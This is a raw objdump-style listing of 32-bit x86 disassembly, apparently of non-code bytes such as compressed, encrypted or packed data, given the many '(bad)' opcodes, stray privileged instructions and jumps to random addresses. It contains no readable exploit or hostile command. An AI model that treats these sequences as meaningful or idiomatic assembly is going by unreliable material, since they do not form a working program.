  435509:	bound  eax,QWORD PTR [eax]
  43550b:	add    BYTE PTR [edi+0xfeaffca],dh
  435511:	idiv   BYTE PTR [ecx-0x17f627fe]
  435517:	loop   0x43550d
  435519:	add    eax,DWORD PTR [eax]
  43551b:	adc    edi,0xfffffff7
  43551e:	loope  0x43554c
  435520:	call   0x44eb:0xfe73febd
  435527:	add    esp,esi
  435529:	add    edi,DWORD PTR [ebx-0x1d]
  43552c:	jg     0x435513
  43552e:	sbb    esi,esi
  435530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435531:	cmp    al,0x75
  435533:	xor    DWORD PTR [ecx+0x78],esp
  435536:	and    al,0x18
  435538:	mov    WORD PTR [eax+0x1a],?
  43553b:	add    BYTE PTR [ebx+ebp*8+0x3a41024],dh
  435542:	or     esi,0x27
  435545:	lds    edi,FWORD PTR [edx]
  435547:	call   0x43554c
	...
  435564:	add    BYTE PTR [eax],al
  435566:	sub    bl,BYTE PTR [esi]
  435568:	add    BYTE PTR [eax],al
  43556a:	call   FWORD PTR [edi+0x24]
  43556d:	adc    BYTE PTR [eax+0xc],bl
  435570:	lea    eax,[eax+ecx*1+0xc]
  435574:	push   eax
  435575:	push   0x75
  435577:	gs add al,0x58
  43557a:	in     eax,dx
  43557b:	pop    edi
  43557c:	and    al,0x18
  43557e:	sbb    al,0x36
  435580:	sub    dh,bh
  435582:	adc    eax,DWORD PTR [edi-0xaf2db92]
  435588:	out    0xf9,al
  43558a:	sub    eax,DWORD PTR [edi]
  43558c:	add    DWORD PTR [ebx-0x45],ebx
  43558f:	mov    ecx,0xfc8656be
  435594:	pop    edx
  435595:	mov    esi,0x3c7ee911
  43559a:	popf   
  43559b:	or     eax,DWORD PTR [ebp+0x0]
  43559e:	or     al,0x57
  4355a0:	cmp    eax,0x119da52
  4355a5:	push   ebx
  4355a6:	ret    0x6c35
  4355a9:	mov    esp,0x53042b95
  4355ae:	ret    0x11bd
  4355b1:	pushf  
  4355b2:	jmp    FWORD PTR [eax]
  4355b4:	add    al,0x87
  4355b6:	std    
  4355b7:	icebp  
  4355b8:	div    DWORD PTR [ebx+0x22]
  4355bb:	inc    ecx
  4355bc:	mov    WORD PTR [esi],cs
  4355be:	or     eax,0x18fb58e9
  4355c3:	cmc    
  4355c4:	adc    eax,DWORD PTR [eax+0xd]
  4355c7:	fs mov edi,0x73
	...
  4355e5:	add    BYTE PTR [eax],al
  4355e7:	add    BYTE PTR ds:0xfb562e,dl
  4355ed:	or     DWORD PTR [esi],0x10f0d40
  4355f3:	adc    eax,0x3eda11
  4355f8:	bound  eax,QWORD PTR [edi]
  4355fa:	lds    edx,FWORD PTR [esi+eax*4+0x4c]
  4355fe:	test   bl,ch
  435600:	std    
  435601:	scas   al,BYTE PTR es:[edi]
  435602:	ins    BYTE PTR es:[edi],dx
  435603:	push   ecx
  435604:	cwde   
  435605:	ror    esi,cl
  435607:	push   edi
  435608:	mov    ch,0xa3
  43560a:	jns    0x435607
  43560c:	call   0xe6e9:0x2708723d
  435613:	mov    ds:0x5a002e42,eax
  435618:	mov    DWORD PTR [eax],ebp
  43561a:	jae    0x435634
  43561c:	mov    bh,bh
  43561e:	stos   DWORD PTR es:[edi],eax
  43561f:	rol    edx,cl
  435621:	not    BYTE PTR [ebx-0x1e9399f5]
  435627:	jmp    0x4355c7
  435629:	aaa    
  43562a:	or     al,BYTE PTR [eax]
  43562c:	nop
  43562d:	mov    edi,0xc022067c
  435632:	test   al,0xec
  435634:	dec    eax
  435635:	xor    DWORD PTR [ecx],ebp
  435637:	retf   0xfb80
  43563a:	call   0x6626e895
  43563f:	call   0x590fd67e
  435644:	sub    esi,esi
  435646:	call   0x5c9601a0
  43564b:	js     0x43564d
	...
  435669:	add    cl,dh
  43566b:	daa    
  43566c:	and    esp,ebp
  43566e:	push   DWORD PTR [edx+edi*4-0x1]
  435672:	xchg   ebx,eax
  435673:	mov    esi,0x3c94523e
  435678:	add    eax,0xcd6c8810
  43567d:	aaa    
  43567e:	push   ebp
  43567f:	call   0xf629d767
  435684:	arpl   WORD PTR [eax+0x29],cx
  435687:	push   eax
  435688:	cmp    esp,ebp
  43568a:	xchg   ch,dh
  43568c:	cmp    edi,0x3cf4c08e
  435692:	dec    edx
  435693:	pop    esp
  435694:	int    0xf
  435696:	or     eax,0x5d282483
  43569b:	xchg   DWORD PTR [edi+eiz*1+0x27a4831d],ebp
  4356a2:	adc    eax,0x527ac87
  4356a7:	mov    DWORD PTR [edx],esp
  4356a9:	push   esp
  4356aa:	mov    BYTE PTR [ecx*1+0x53cce14],bh
  4356b1:	sbb    al,0x10
  4356b3:	add    BYTE PTR [eax],al
  4356b5:	jmp    0x58717c8
  4356ba:	xor    edi,edi
  4356bc:	(bad)  
  4356bd:	call   0xc58717d0
  4356c2:	xor    dh,dh
  4356c4:	cli    
  4356c5:	jmp    0x986e3ed8
  4356ca:	push   cs
  4356cb:	add    BYTE PTR [edx+0x72],bl
	...
  4356ea:	add    BYTE PTR [eax],al
  4356ec:	fs push esp
  4356ee:	mov    edi,0x80e99794
  4356f3:	add    eax,0xe9faf611
  4356f8:	popf   
  4356f9:	jl     0x4356f2
  4356fb:	in     al,0x33
  4356fd:	cli    
  4356fe:	dec    edi
  4356ff:	shl    ebp,1
  435701:	clc    
  435702:	cli    
  435703:	(bad)  
  435704:	mov    dh,BYTE PTR [ebp-0x7b821d8d]
  43570a:	test   esp,0x90e7fa13
  435710:	pusha  
  435711:	add    BYTE PTR [eax],al
  435713:	mov    al,ds:0xbd874bcf
  435718:	(bad)
  43571c:	pop    ebx
  43571d:	jge    0x435793
  43571f:	icebp  
  435720:	xchg   edi,eax
  435721:	(bad)  
  435722:	push   edx
  435723:	pusha  
  435724:	cmp    eax,0x91c8cec
  435729:	dec    edi
  43572a:	sti    
  43572b:	cld    
  43572c:	add    bh,BYTE PTR [ebp-0x2b]
  43572f:	adc    ecx,edx
  435731:	pop    edx
  435732:	add    BYTE PTR [ebx],al
  435734:	or     BYTE PTR [edx-0x77],dl
  435737:	or     al,0xc1
  435739:	stc    
  43573a:	dec    edi
  43573b:	mov    ecx,0x640ab485
  435740:	lods   eax,DWORD PTR ds:[esi]
  435741:	hlt    
  435742:	cli    
  435743:	jmp    0x9cd055df
  435748:	xchg   esi,eax
  435749:	dec    edi
  43574a:	xchg   DWORD PTR [eax],eax
  43574c:	pop    ecx
  43574d:	add    al,0x68
  43574f:	sub    al,0x0
	...
  43576d:	add    al,bh
  43576f:	inc    eax
  435770:	add    bh,bh
  435772:	lds    ecx,FWORD PTR [eax]
  435774:	dec    esi
  435775:	call   DWORD PTR [eax+ebp*1-0x78843f7b]
  43577c:	xchg   edx,eax
  43577d:	add    BYTE PTR [eax+eax*1-0x7d],dh
  435781:	inc    ebp
  435782:	cld    
  435783:	mov    DWORD PTR [edx],eax
  435785:	lea    esp,[ecx+0x446a4ce8]
  43578b:	data16 sbb al,0x50
  43578e:	dec    ebx
  43578f:	nop
  435790:	mov    BYTE PTR [eax],0x34
  435793:	add    BYTE PTR [ebp+0x216dc1c0],al
  435799:	inc    ebp
  43579a:	sub    BYTE PTR [eax],bh
  43579c:	inc    ebp
  43579d:	call   0xdb6eb964
  4357a2:	scas   eax,DWORD PTR es:[edi]
  4357a3:	cmp    al,0xec
  4357a5:	mov    ecx,eax
  4357a7:	(bad)  
  4357a8:	sbb    eax,DWORD PTR [ebp+0x6a44774b]
  4357ae:	xor    al,0x4d
  4357b0:	not    DWORD PTR ds:0x401148
  4357b6:	jno    0x435774
  4357b8:	outs   dx,BYTE PTR ds:[esi]
  4357b9:	aaa    
  4357ba:	xor    esp,DWORD PTR [esi+0x0]
  4357bd:	sbb    DWORD PTR [ebp+esi*8-0xa60371e],0xfffffff5
  4357c5:	mov    edi,DWORD PTR [ebx+edi*2-0xb]
  4357c9:	je     0x43578f
  4357cb:	mov    BYTE PTR [ebx+0x14],cl
  4357ce:	and    eax,DWORD PTR [ecx+0xffc2]
	...
  4357f0:	mov    esi,ss
  4357f2:	(bad)  
  4357f4:	sub    ecx,DWORD PTR [eax-0x774b8b46]
  4357fa:	dec    ebx
  4357fb:	adc    al,0x7
  4357fd:	mov    esp,0x5d0d5c62
  435802:	inc    esp
  435803:	add    BYTE PTR [ebp+0x41],cl
  435806:	ret    0x92dc
  435809:	cmp    dl,BYTE PTR [ebp-0x18]
  43580c:	xchg   ebp,eax
  43580d:	sub    al,0xfd
  43580f:	cli    
  435810:	and    BYTE PTR [edx+edi*8-0x7edb2f7a],0xbe
  435818:	int    0xdd
  43581a:	inc    ecx
  43581b:	call   0x5ccc9dff
  435820:	pop    ebp
  435821:	pop    esi
  435822:	inc    ebx
  435823:	hlt    
  435824:	xchg   cl,ah
  435826:	mov    DWORD PTR [ebp+eiz*2-0x69],edx
  43582a:	dec    esi
  43582b:	sti    
  43582c:	(bad)  
  43582e:	xchg   DWORD PTR [ebp+eax*2+0x5e],eax
  435832:	or     al,0x50
  435834:	cmp    bl,BYTE PTR [eax-0x134704fa]
  43583a:	xchg   DWORD PTR [ecx],eax
  43583c:	ret    
  43583d:	ror    DWORD PTR [esi+0x14],1
  435840:	and    dl,BYTE PTR [eax+edx*1-0x79]
  435844:	adc    edi,DWORD PTR [edi]
  435846:	(bad)  
  435847:	cli    
  435848:	cwde   
  435849:	lock push esp
  43584b:	sti    
  43584c:	pop    ebp
  43584d:	or     eax,0x6512bf83
  435852:	sub    edi,ebx
	...
  435870:	add    BYTE PTR [eax],al
  435872:	cli    
  435873:	mov    eax,ds:0x6e0574fb
  435878:	add    eax,0x5c38ea52
  43587d:	xchg   DWORD PTR [eax-0x7],esp
  435880:	xchg   DWORD PTR [ecx],eax
  435882:	inc    edx
  435883:	inc    DWORD PTR [ebx]
  435885:	push   edx
  435886:	rcr    BYTE PTR [eax],cl
  435888:	adc    BYTE PTR [ebp+0x395cebcd],al
  43588e:	dec    edx
  43588f:	loope  0x43590d
  435891:	pop    ecx
  435892:	xchg   ch,ah
  435894:	mov    DWORD PTR [ebp+eax*1+0x0],ecx
  435898:	mov    eax,0xe56aa654
  43589d:	push   eax
  43589e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43589f:	dec    edi
  4358a0:	test   eax,0xa26c5a86
  4358a5:	mov    BYTE PTR [ebx-0x23ec4c7d],dl
  4358ab:	gs jmp 0x963f58ad
  4358b1:	cld    
  4358b2:	retf   0x6417
  4358b5:	ret    
  4358b6:	stc    
  4358b7:	adc    al,0x22
  4358b9:	jbe    0x4358bc
  4358bb:	xchg   DWORD PTR [ebx-0x640d4009],ebp
  4358c1:	setb   dh
  4358c4:	or     DWORD PTR [esi-0x3],esi
  4358c7:	out    0x4a,eax
  4358c9:	std    
  4358ca:	inc    edi
  4358cb:	repnz ins DWORD PTR es:[edi],dx
  4358cd:	inc    esi
  4358ce:	sbb    eax,0x3653e087
  4358d3:	push   eax
  4358d4:	loope  0x43585e
	...
  4358f2:	add    BYTE PTR [eax],al
  4358f4:	xor    ecx,DWORD PTR [ecx-0x1e]
  4358f7:	jno    0x43590e
  4358f9:	dec    edi
  4358fa:	ficom  DWORD PTR [ecx+ecx*8+0x7c]
  4358fe:	test   al,0x70
  435900:	pop    ebx
  435901:	repnz push ebx
  435903:	or     al,0x8a
  435905:	(bad)  
  435906:	adc    eax,0x1a485afb
  43590b:	pop    edx
  43590c:	pop    edx
  43590d:	(bad)  
  43590e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43590f:	adc    al,0xd
  435911:	dec    ebx
  435912:	pop    esi
  435913:	call   0x5583da5
  435918:	or     eax,0x3e523600
  43591d:	push   0x1a8825
  435922:	add    DWORD PTR [eax],edi
  435924:	add    DWORD PTR [eax-0x17],0xe911afeb
  43592b:	add    ecx,DWORD PTR [edx-0x24460010]
  435931:	sub    ch,bh
  435933:	fidiv  WORD PTR [edx]
  435935:	xchg   bh,bh
  435937:	call   0x70929a4a
  43593c:	inc    esp
  43593d:	hlt    
  43593e:	xchg   bh,ch
  435940:	cmp    al,0xf5
  435942:	dec    edi
  435943:	fisttp QWORD PTR [ebp-0x64378b4f]
  435949:	dec    DWORD PTR [esp+ebp*4-0x3cb0af7a]
  435950:	adc    BYTE PTR [esi-0x5],cl
  435953:	cdq    
  435954:	add    bh,BYTE PTR [ebx-0x41]
  435957:	pushf  
	...
  435974:	add    BYTE PTR [eax],al
  435976:	mov    esi,0xc96d1c67
  43597b:	jmp    DWORD PTR [edi-0x1b]
  43597e:	xchg   edx,eax
  43597f:	xor    DWORD PTR [eax],eax
  435981:	add    DWORD PTR [ebp-0x6416ffea],esp
  435987:	jmp    0x22005bc2
  43598c:	lea    ebp,[edx+eax*2-0x6e9b72bf]
  435993:	idiv   edx
  435995:	out    0xbe,al
  435997:	add    BYTE PTR [ecx+ebx*4-0x42],0xf4
  43599c:	je     0x43596f
  43599e:	mov    ecx,edi
  4359a0:	xchg   BYTE PTR [esi+0x2db03c4f],bl
  4359a6:	adc    DWORD PTR [eax],eax
  4359a8:	add    BYTE PTR [esi-0x49067773],ah
  4359ae:	test   DWORD PTR [eax],0xe80ee901
  4359b4:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4359b6:	out    0xf5,eax
  4359b8:	xchg   dh,ah
  4359ba:	aas    
  4359bb:	cmc    
  4359bc:	dec    edi
  4359bd:	loope  0x43594a
  4359bf:	cmp    edi,eax
  4359c1:	bound  eax,QWORD PTR [esi]
  4359c3:	push   eax
  4359c4:	sti    
  4359c5:	add    BYTE PTR ds:0x1a068304,ah
  4359cb:	cmc    
  4359cc:	dec    edx
  4359cd:	or     BYTE PTR [edx+ecx*2-0x7e5bffd6],cl
  4359d4:	pop    ebx
  4359d5:	cld    
  4359d6:	lock call DWORD PTR [edx]
  4359d9:	rol    BYTE PTR [eax],0x0
	...
  4359f8:	cmp    edx,ebp
  4359fa:	jns    0x4359bc
  4359fc:	pop    edi
  4359fd:	add    eax,0x754cc0af
  435a02:	repz call ebx
  435a05:	push   ebp
  435a06:	push   esi
  435a07:	pop    ebx
  435a08:	cmp    eax,0xd08b53ba
  435a0d:	jnp    0x4359f5
  435a0f:	jl     0x435a78
  435a11:	cld    
  435a12:	call   DWORD PTR [edx-0x56]
  435a15:	dec    ebp
  435a16:	mov    bl,0x0
  435a18:	jne    0x435a16
  435a1a:	call   DWORD PTR [edx-0xf]
  435a1d:	xchg   DWORD PTR [esi-0x3],edi
  435a20:	add    esi,esi
  435a22:	dec    edi
  435a23:	dec    ecx
  435a25:	clc    
  435a26:	xor    al,0xbf
  435a29:	dec    BYTE PTR [ebp-0x1]
  435a2c:	xchg   esp,eax
  435a2d:	add    BYTE PTR [ebp+0x7afeb8c0],al
  435a33:	gs and ah,bh
  435a36:	loop   0x435a4c
  435a38:	mov    cl,0x70
  435a3a:	jg     0x435a39
  435a3c:	inc    ebx
  435a3d:	test   BYTE PTR [edx+0x6a],0x24
  435a41:	jnp    0x435a05
  435a43:	(bad)  
  435a44:	fmul   st(2),st
  435a46:	xlat   BYTE PTR ds:[ebx]
  435a47:	inc    ebx
  435a49:	jnp    0x435a8e
  435a4b:	or     al,0x6f
  435a4d:	add    cl,BYTE PTR [ebx-0x73]
  435a50:	push   ecx
  435a51:	cmp    al,0xff
  435a54:	mov    bl,0x53
  435a56:	div    DWORD PTR [ebp+0xc]
  435a59:	push   edx
  435a5a:	not    DWORD PTR [eax+0x0]
	...
  435a79:	add    BYTE PTR ds:0x88fb33ed,cl
  435a7f:	cdq    
  435a80:	outs   dx,DWORD PTR ds:[esi]
  435a81:	add    eax,0xe71c0494
  435a86:	push   ds
  435a87:	pop    esp
  435a88:	jnp    0x435a0d
  435a8a:	mov    ebx,0x5a4ff976
  435a8f:	pop    edx
  435a90:	int3   
  435a91:	cli    
  435a92:	mov    ch,0x96
  435a94:	(bad)  
  435a95:	cli    
  435a96:	mov    ds:0x86183b70,al
  435a9b:	fist   WORD PTR [ebx-0x73]
  435a9e:	and    BYTE PTR [ebp-0x8],0xfa
  435aa2:	mov    cl,BYTE PTR [eax-0x68de8b09]
  435aa8:	test   DWORD PTR [edi+0x21],0x1f74c45c
  435aaf:	dec    esp
  435ab0:	jnp    0x435a35
  435ab2:	imul   esp,DWORD PTR [esi],0x59ba4ff9
  435ab8:	int3   
  435ab9:	cli    
  435aba:	gs pop esi
  435abc:	xlat   BYTE PTR ds:[ebx]
  435abd:	cli    
  435abe:	push   edx
  435abf:	(bad)  
  435ac0:	cld    
  435ac1:	xchg   BYTE PTR [ebx],dl
  435ac3:	je     0x435b08
  435ac5:	cld    
  435ac6:	fsub   st(5),st
  435ac8:	imul   edx,DWORD PTR [eax],0x104ef5e3
  435ace:	mov    BYTE PTR [ecx],bl
  435ad0:	jo     0x435ad6
  435ad2:	mov    ?,WORD PTR [eax+edi*8]
  435ad5:	call   DWORD PTR [edi+0x154c81e7]
  435adb:	sub    cl,bh
  435add:	je     0x435adf
	...
  435afb:	add    cl,bh
  435afd:	ss stc 
  435aff:	dec    edi
  435b00:	sbb    eax,0x973bf5c
  435b05:	pop    edx
  435b06:	pop    edx
  435b07:	clc    
  435b08:	or     eax,0x788d6a43
  435b0d:	gs push edi
  435b0f:	call   0xf9635aab
  435b14:	out    0x59,eax
  435b16:	push   ss
  435b17:	xchg   DWORD PTR [ecx-0x28],esp
  435b1a:	xor    ah,ch
  435b1c:	push   edi
  435b1d:	imul   ecx,DWORD PTR [edx-0x1eab6c08],0x29745abb
  435b27:	add    al,0x90
  435b29:	out    dx,al
  435b2a:	pop    ebp
  435b2b:	repz pop es
  435b2d:	inc    ebp
  435b2e:	jb     0x435bae
  435b30:	fdivr  st,st(6)
  435b32:	lods   al,BYTE PTR ds:[esi]
  435b33:	shl    DWORD PTR [ebx],cl
  435b35:	ins    DWORD PTR es:[edi],dx
  435b36:	popa   
  435b37:	add    edx,DWORD PTR [edx-0x7ffb2349]
  435b3d:	cmp    al,0x41
  435b3f:	test   BYTE PTR [ecx],cl
  435b41:	cld    
  435b42:	call   0xa4887198
  435b47:	pop    es
  435b48:	xchg   edx,eax
  435b49:	je     0x435b54
  435b4b:	push   esi
  435b4c:	fsub   st(6),st
  435b4e:	mov    bl,0xf7
  435b50:	(bad)  
  435b52:	fwait
  435b53:	or     edx,DWORD PTR [eax+0x56536544]
  435b59:	xor    eax,0x116d0e12
  435b5e:	test   eax,0x3
	...
  435b7b:	add    BYTE PTR [eax],al
  435b7d:	add    BYTE PTR [edx+0x2ac16dc7],dl
  435b83:	in     al,0x6
  435b85:	clc    
  435b86:	aaa    
  435b87:	sub    BYTE PTR [edi+edx*1],0x36
  435b8b:	je     0x435b6a
  435b8d:	jmp    0x435bd8
  435b8f:	icebp  
  435b90:	loope  0x435b89
  435b92:	daa    
  435b93:	je     0x435b96
  435b95:	in     al,dx
  435b96:	inc    ecx
  435b97:	icebp  
  435b98:	shl    edi,1
  435b9a:	mov    edi,0x7f299d7
  435b9f:	out    dx,al
  435ba0:	and    DWORD PTR [esi+0x5a],edx
  435ba3:	mov    bh,0xa6
  435ba5:	sbb    BYTE PTR ds:0xe5620053,cl
  435bab:	sub    bl,0x65
  435bae:	sldt   WORD PTR [eax]
  435bb1:	cmp    dl,BYTE PTR [ebx+0x51]
  435bb4:	push   0x2d869d
  435bb9:	add    ebp,esp
  435bbb:	xchg   BYTE PTR [edi],bh
  435bbd:	jmp    0xe9604278
  435bc2:	push   cs
  435bc3:	test   edi,ebp
  435bc5:	mov    edx,0x817478d7
  435bca:	neg    ah
  435bcc:	or     ah,BYTE PTR [ebp-0x5e]
  435bcf:	add    BYTE PTR [eax],al
  435bd1:	jmp    0xe8a95b6d
  435bd6:	aas    
  435bd7:	push   edx
  435bd8:	mov    DWORD PTR [esi+edx*4-0x7256b016],esi
  435bdf:	lods   eax,DWORD PTR ds:[esi]
  435be0:	or     ch,BYTE PTR [eax+eax*1+0x0]
	...
  435c00:	add    BYTE PTR [bx+si],al
  435c03:	jmp    0xa4d05b8f
  435c08:	push   0x50
  435c0a:	data16 (bad) 
  435c0d:	call   0xadd15961
  435c12:	or     ah,BYTE PTR [ebx+ebx*4+0x0]
  435c16:	add    cl,ch
  435c18:	popa   
  435c19:	mov    es,WORD PTR [eax]
  435c1b:	jmp    0x587e12e
  435c20:	xchg   esi,eax
  435c21:	add    eax,0x3b2a948d
  435c26:	push   eax
  435c27:	neg    cl
  435c29:	daa    
  435c2a:	test   DWORD PTR [ecx],ebp
  435c2c:	adc    al,BYTE PTR [ebx+0xee884]
  435c32:	cmp    DWORD PTR [ebx*1+0x85583fa],edi
  435c39:	add    BYTE PTR [eax],al
  435c3b:	bound  ecx,QWORD PTR [ebp-0x14]
  435c3e:	xchg   BYTE PTR [eax],al
  435c40:	cld    
  435c41:	mov    dl,0xfa
  435c43:	add    ah,ah
  435c45:	add    BYTE PTR [esi-0x73],cl
  435c48:	push   ecx
  435c49:	cmp    eax,0x684ebbff
  435c4f:	lock imul DWORD PTR [edi]
  435c52:	or     dl,BYTE PTR [eax+0x7b]
  435c55:	push   ebx
  435c56:	adc    al,0x85
  435c58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435c59:	pop    esp
  435c5a:	add    eax,0xe1f3f989
  435c5f:	adc    edi,DWORD PTR [ecx]
  435c61:	cmp    BYTE PTR [edx-0x2],0x0
	...
  435c81:	add    BYTE PTR [ebx],bh
  435c83:	test   BYTE PTR [edx+0x53],0x27
  435c87:	mov    ecx,0xc867e8f5
  435c8c:	cmc    
  435c8d:	call   FWORD PTR ds:0x718bf040
  435c93:	hlt    
  435c94:	or     DWORD PTR [eax],0x80937752
  435c9a:	fprem1 
  435c9c:	cmc    
  435c9d:	push   edx
  435c9e:	pop    esp
  435c9f:	lock stc 
  435ca1:	xor    DWORD PTR [eax+0x50],esp
  435ca4:	not    DWORD PTR [ecx+0x50]
  435ca7:	jg     0x435c63
  435ca9:	je     0x435d1b
  435cab:	xor    edi,esi
  435cad:	jmp    0x435d15
  435caf:	ja     0x435c34
  435cb1:	cmp    cl,0xf5
  435cb4:	cmc    
  435cb5:	push   eax
  435cb6:	xchg   edi,eax
  435cb7:	add    edx,0xd7ff0cff
  435cbd:	dec    DWORD PTR [ebx]
  435cbf:	jp     0x435cb3
  435cc1:	push   0xffffff9d
  435cc3:	ja     0x435d38
  435cc5:	test   BYTE PTR [eax+ebx*8-0xdc487db],bl
  435ccc:	mov    dl,0x58
  435cce:	rol    BYTE PTR [ebx+0x0],0x8b
  435cd2:	push   esp
  435cd3:	es repz je 0x435ce4
  435cd7:	fld    DWORD PTR [edi-0xbf3692e]
  435cdd:	xchg   BYTE PTR [eax-0x3f],bh
  435ce0:	cmp    bh,al
  435ce2:	or     ah,BYTE PTR ds:0x36cc
	...
  435d04:	(bad)  
  435d05:	sub    eax,0xbb246206
  435d0a:	push   0x5
  435d0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435d0d:	inc    ebp
  435d0e:	mov    BYTE PTR [edi],bh
  435d10:	or     eax,0x80504f27
  435d15:	sbb    al,0x80
  435d17:	dec    edi
  435d18:	arpl   WORD PTR [edx+0xa],di
  435d1b:	loopne 0x435d3c
  435d1d:	sbb    DWORD PTR [edi+eax*4],eax
  435d20:	aad    0x5c
  435d22:	cmp    edi,eax
  435d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435d25:	cmp    edi,ebx
  435d27:	cli    
  435d28:	stos   BYTE PTR es:[edi],al
  435d29:	push   esi
  435d2a:	ror    BYTE PTR [edi],0xa2
  435d2d:	int3   
  435d2e:	out    dx,al
  435d2f:	xchg   BYTE PTR [ebp-0x6d0f75af],bl
  435d35:	push   edx
  435d36:	dec    ebp
  435d37:	call   0xfb38a5d9
  435d3c:	mov    es,WORD PTR [ebx-0xb]
  435d3f:	je     0x435d52
  435d41:	push   esi
  435d42:	pop    ebx
  435d43:	hlt    
  435d44:	or     eax,0xff43b2b
  435d49:	mov    ch,0x2f
  435d4b:	data16 fbstp TBYTE PTR [ebx+0x6b]
  435d4f:	les    esi,FWORD PTR [ebp+0x5272c010]
  435d55:	adc    al,BYTE PTR [ebx+0x66a94544]
  435d5b:	repnz push cs
  435d5d:	pop    edi
  435d5e:	push   cs
  435d5f:	push   0xd95d63d
  435d64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435d65:	jmp    0x435d66
  435d67:	cdq    
	...
  435d84:	add    BYTE PTR [eax],al
  435d86:	inc    DWORD PTR [eax+0x81fee5]
  435d8c:	imul   DWORD PTR [ebx+0x1d]
  435d8f:	inc    DWORD PTR [eax+0x38c28a11]
  435d95:	mov    DWORD PTR [ecx-0x14],edx
  435d98:	sar    BYTE PTR [esi],0x0
  435d9b:	jmp    0x435d5e
  435d9d:	in     eax,dx
  435d9e:	push   ecx
  435d9f:	hlt    
  435da0:	in     al,0x6f
  435da2:	and    dl,BYTE PTR [esi+0x38]
  435da5:	xchg   DWORD PTR [ecx-0x30],esp
  435da8:	adc    ah,ch
  435daa:	mov    esi,DWORD PTR [edx-0x5e]
  435dad:	hlt    
  435dae:	mov    DWORD PTR [ecx+eiz*4+0x53],eax
  435db2:	gs repnz in eax,0xbd
  435db6:	sbb    ebx,DWORD PTR [eax-0x67]
  435db9:	add    al,cl
  435dbb:	push   cs
  435dbc:	adc    edi,ebp
  435dbe:	mov    ebx,0xa46bd5b8
  435dc3:	(bad)  
  435dc4:	lahf   
  435dc5:	adc    BYTE PTR ds:0x13bfe5f0,dh
  435dcb:	ja     0x435df7
  435dcd:	push   ebx
  435dce:	xchg   edx,eax
  435dcf:	inc    esp
  435dd0:	pop    ebp
  435dd1:	jmp    0x435dd9
  435dd3:	in     eax,dx
  435dd4:	push   ecx
  435dd5:	hlt    
  435dd6:	jl     0x435e1c
  435dd8:	push   ebp
  435dd9:	or     edi,ecx
  435ddb:	cs iret 
  435ddd:	jae    0x435d67
  435ddf:	je     0x435dfe
  435de1:	pop    ebx
  435de2:	gs dec ebp
  435de4:	mov    edx,0xa37c67f4
  435de9:	sti    
	...
  435e06:	add    BYTE PTR [eax],al
  435e08:	rcl    BYTE PTR [edi+0x1b],cl
  435e0b:	add    BYTE PTR [ebx],dh
  435e0d:	adc    al,0x91
  435e0f:	repz push ebx
  435e11:	pop    ss
  435e12:	std    
  435e13:	imul   eax,DWORD PTR [eax-0x2],0xffffffba
  435e17:	(bad)  
  435e19:	fsub   st,st(5)
  435e1b:	and    DWORD PTR es:[eax-0x7],ebx
  435e1f:	(bad)  
  435e20:	jmp    0x873a:0x68620013
  435e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435e28:	sbb    ah,dl
  435e2a:	into   
  435e2b:	in     eax,0x1e
  435e2d:	in     eax,0x86
  435e2f:	push   esp
  435e30:	xor    DWORD PTR [ecx],ebx
  435e32:	xlat   BYTE PTR ds:[ebx]
  435e33:	bound  edx,QWORD PTR [esp+ebp*8-0x7a]
  435e37:	loope  0x435e97
  435e39:	in     eax,0x50
  435e3b:	icebp  
  435e3c:	jnp    0x435e82
  435e3e:	in     al,dx
  435e3f:	jb     0x435e32
  435e41:	jl     0x435e97
  435e43:	mov    ch,0x43
  435e45:	push   eax
  435e46:	sti    
  435e47:	sbb    BYTE PTR ds:0x92f6bf83,al
  435e4d:	inc    ecx
  435e4e:	cli    
  435e4f:	sahf   
  435e50:	fiadd  WORD PTR [edx+0x14a8544]
  435e56:	push   eax
  435e57:	mov    ds,WORD PTR [eax-0x8]
  435e5a:	xchg   bh,ch
  435e5c:	push   esp
  435e5d:	in     eax,0x4f
  435e5f:	icebp  
  435e60:	xor    ecx,DWORD PTR [eax+edi*8+0x3]
  435e64:	cmp    al,0x48
  435e66:	call   0xfb2a154b
  435e6b:	mov    BYTE PTR [eax],0x0
	...
  435e8a:	cmp    al,0x51
  435e8c:	leave  
  435e8d:	sub    dh,BYTE PTR [ecx+eax*4]
  435e90:	jmp    0x435efa
  435e92:	ins    DWORD PTR es:[edi],dx
  435e93:	jne    0x435e94
  435e95:	call   0x9e9597a8
  435e9a:	lea    esi,[esp+eax*8+0x51]
  435e9e:	push   ebp
  435e9f:	outs   dx,DWORD PTR ds:[esi]
  435ea0:	sti    
  435ea1:	ss pop esi
  435ea3:	je     0x435eb1
  435ea5:	bound  edx,QWORD PTR [edi+0x39]
  435ea8:	ror    bx,1
  435eab:	jp     0x435e69
  435ead:	xchg   ebp,eax
  435eae:	pop    edi
  435eaf:	out    0xfa,al
  435eb1:	add    DWORD PTR [eax-0x2ff1053a],eax
  435eb7:	inc    esi
  435eb8:	test   DWORD PTR [eax],eax
  435eba:	in     al,0x6d
  435ebc:	and    DWORD PTR [ebx+0x881e569],ecx
  435ec2:	mov    cl,0x46
  435ec4:	or     al,0x52
  435ec6:	scas   eax,DWORD PTR es:[edi]
  435ec7:	les    ecx,FWORD PTR [eax+edx*2+0x33]
  435ecb:	xchg   esp,eax
  435ecc:	mov    es,WORD PTR [eax]
  435ece:	and    al,0xfd
  435ed0:	test   al,al
  435ed2:	imul   ebp,edx,0xc4e07581
  435ed8:	jge    0x435ed1
  435eda:	shr    ch,cl
  435edc:	loope  0x435ee0
  435ede:	idiv   DWORD PTR [ebp+edx*2-0x435500a2]
  435ee5:	or     ah,dh
  435ee7:	inc    edi
  435ee8:	sub    esp,0x65
  435eeb:	leave  
  435eec:	mov    esi,0x0
	...
  435f09:	add    BYTE PTR [eax],al
  435f0b:	add    ah,ah
  435f0d:	cld    
  435f0e:	dec    edx
  435f0f:	push   esi
  435f10:	or     ebp,DWORD PTR [ecx+0x7c]
  435f13:	or     bl,bh
  435f15:	push   0x491e56eb
  435f1a:	pop    eax
  435f1b:	call   0x394d41
